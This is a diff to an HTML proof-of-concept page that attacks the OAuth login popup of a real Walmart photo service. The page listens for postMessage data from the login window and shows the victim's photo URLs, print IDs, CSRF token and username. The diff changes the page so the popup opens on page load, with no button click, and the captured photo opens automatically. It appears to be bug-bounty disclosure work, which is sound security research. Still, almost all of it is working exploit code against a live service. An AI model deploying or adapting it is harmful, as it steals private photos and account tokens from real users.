@@ -7,82 +7,72 @@
 <body>
     <h3>PoC - Access User Photos</h3>
     
-    <button onclick="startFlow()">Start - Login & Get Photos</button>
-    
     <div id="output" style="margin-top:20px;"></div>
 
 <script>
 const LOGIN_URL = 'https://photos3.walmart.com/users/oauth2/login';
 
-function startFlow() {
-    console.log('Opening login popup...');
+window.onload = function () {
+    console.log('Auto opening login popup...');
     
     const popup = window.open(LOGIN_URL, 'loginPopup', 'width=700,height=800');
-    
+
     if (!popup) {
-        alert('Popup blocked! Allow popups and try again.');
+        alert('Popup blocked! Allow popups.');
         return;
     }
-    
-    // Listen for message from popup
+
     window.addEventListener('message', function(event) {
-        // Check message is from walmart
         if (event.origin !== 'https://photos3.walmart.com' && 
             event.origin !== 'https://www.walmart.com') {
             return;
         }
-        
+
         console.log('Message received from:', event.origin);
-        console.log('Raw data:', event.data);
-        
-        // Check if message contains login data
+
         if (typeof event.data === 'string' && event.data.includes('login:')) {
-            
-            // Extract JSON part
-            const jsonStr = event.data.split('login:')[1];
-            const data = JSON.parse(jsonStr);
-            
-            // Show captured data
-            const output = document.getElementById('output');
-            output.innerHTML = '<h4>✅ Captured Data:</h4>';
-            output.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
-            
-            // Get photo URL
-            const photoUrl = data.previous_basket_contents?.prints_thumbnail;
-            const printIds = data.previous_basket_contents?.print_ids;
-            
-            if (photoUrl) {
-                output.innerHTML += '<h4>📸 User Photo URL:</h4>';
-                output.innerHTML += '<p>' + photoUrl + '</p>';
-                output.innerHTML += '<a href="' + photoUrl + '" target="_blank">Open Photo in New Tab</a>';
-                
-                // Auto-open photo to prove access
-                setTimeout(() => {
+            try {
+                const jsonStr = event.data.split('login:')[1];
+                const data = JSON.parse(jsonStr);
+
+                const output = document.getElementById('output');
+                output.innerHTML = '<h4>✅ Captured Data:</h4>';
+                output.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+
+                const photoUrl = data.previous_basket_contents?.prints_thumbnail;
+                const printIds = data.previous_basket_contents?.print_ids;
+
+                if (photoUrl) {
+                    output.innerHTML += '<h4>📸 User Photo URL:</h4>';
+                    output.innerHTML += '<p>' + photoUrl + '</p>';
+
+                    // Auto open in new tab
                     window.open(photoUrl, '_blank');
-                }, 1000);
-            }
-            
-            if (printIds && printIds.length > 0) {
-                output.innerHTML += '<h4>📋 Print IDs:</h4>';
-                output.innerHTML += '<p>' + printIds.join(', ') + '</p>';
-            }
-            
-            // Show CSRF token
-            if (data.csrf) {
-                output.innerHTML += '<h4>🔑 CSRF Token:</h4>';
-                output.innerHTML += '<p>' + data.csrf + '</p>';
-            }
-            
-            // Show username
-            if (data.logged_in_user_name) {
-                output.innerHTML += '<h4>👤 Logged in User:</h4>';
-                output.innerHTML += '<p>' + data.logged_in_user_name + '</p>';
+                }
+
+                if (printIds && printIds.length > 0) {
+                    output.innerHTML += '<h4>📋 Print IDs:</h4>';
+                    output.innerHTML += '<p>' + printIds.join(', ') + '</p>';
+                }
+
+                if (data.csrf) {
+                    output.innerHTML += '<h4>🔑 CSRF Token:</h4>';
+                    output.innerHTML += '<p>' + data.csrf + '</p>';
+                }
+
+                if (data.logged_in_user_name) {
+                    output.innerHTML += '<h4>👤 Logged in User:</h4>';
+                    output.innerHTML += '<p>' + data.logged_in_user_name + '</p>';
+                }
+
+            } catch (e) {
+                console.error('Parsing error:', e);
             }
         }
     });
-    
-    console.log('Waiting for login completion...');
-}
+
+    console.log('Waiting for login...');
+};
 </script>
 </body>
 </html>
